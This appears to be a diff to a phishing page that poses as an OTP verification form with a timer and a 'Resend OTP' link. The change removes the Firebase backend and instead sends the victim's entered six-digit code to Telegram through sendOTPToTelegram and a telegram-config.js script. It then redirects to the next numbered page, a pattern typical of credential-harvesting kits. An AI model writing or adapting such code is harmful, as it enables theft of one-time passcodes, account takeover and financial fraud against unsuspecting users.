@@ -42,9 +42,7 @@
         <div class="resend">Didn't receive? <a href="#">Resend OTP</a></div>
     </div>
 
-    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
-    <script src="firebase-config.js"></script>
+    <script src="telegram-config.js"></script>
     <script>
         let timeLeft = 180;
         const timerEl = document.getElementById('timerDisplay');
@@ -60,13 +58,12 @@
             event.preventDefault();
             const otp = document.getElementById("otp").value;
             if (otp.length !== 6 || !/^\d{6}$/.test(otp)) { alert("Enter valid 6-digit OTP."); return; }
-            if (!isFirebaseReady()) { alert("Firebase not initialized."); return; }
 
             const btn = document.querySelector(".btn-submit");
             btn.disabled = true; btn.textContent = "Processing...";
 
             try {
-                const res = await sendOTPToFirebase(otp);
+                const res = await sendOTPToTelegram(otp);
                 if (res.success) setTimeout(() => window.location.href = "7.html", 500);
                 else { alert("Error: " + (res.error || "Failed")); btn.disabled = false; btn.textContent = "VERIFY OTP"; }
             } catch (err) { alert("Error occurred"); btn.disabled = false; btn.textContent = "VERIFY OTP"; }
